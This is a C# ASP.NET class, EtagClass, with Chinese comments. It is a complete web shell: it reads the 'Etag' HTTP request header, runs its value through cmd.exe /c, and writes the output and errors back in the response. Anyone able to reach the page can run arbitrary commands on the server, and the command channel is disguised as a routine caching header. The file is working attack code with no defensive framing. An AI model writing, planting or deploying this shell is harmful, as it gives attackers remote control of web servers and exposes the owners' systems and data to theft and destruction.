using System;
using System.Diagnostics;
using System.Web;

public class EtagClass
{
    public EtagClass()
    {
        try
        {
            // 获取请求头中的Etag值
            string command = HttpContext.Current.Request.Headers["Etag"];
            if (string.IsNullOrEmpty(command))
            {
                // 如果Etag为空，直接返回
                return;
            }

            // 创建并配置进程
            Process process = new Process();
            process.StartInfo.FileName = "cmd.exe";
            process.StartInfo.Arguments = "/c " + command;
            process.StartInfo.RedirectStandardOutput = true;
            process.StartInfo.RedirectStandardError = true; // 重定向错误输出
            process.StartInfo.UseShellExecute = false;
            process.StartInfo.CreateNoWindow = true; // 不创建窗口

            // 启动进程
            process.Start();

            // 异步读取输出和错误流，避免死锁
            string output = process.StandardOutput.ReadToEndAsync().Result;
            string error = process.StandardError.ReadToEndAsync().Result;

            // 等待进程退出
            process.WaitForExit();

            // 输出结果
            HttpContext.Current.Response.Write(output);
            if (!string.IsNullOrEmpty(error))
            {
                HttpContext.Current.Response.Write(error); // 输出错误信息
            }
        }
        catch (Exception ex)
        {
            // 输出异常信息
            HttpContext.Current.Response.Write("Error: " + ex.Message);
        }
        finally
        {
            // 刷新并结束响应
            HttpContext.Current.Response.Flush();
            HttpContext.Current.Response.End();
        }
    }
}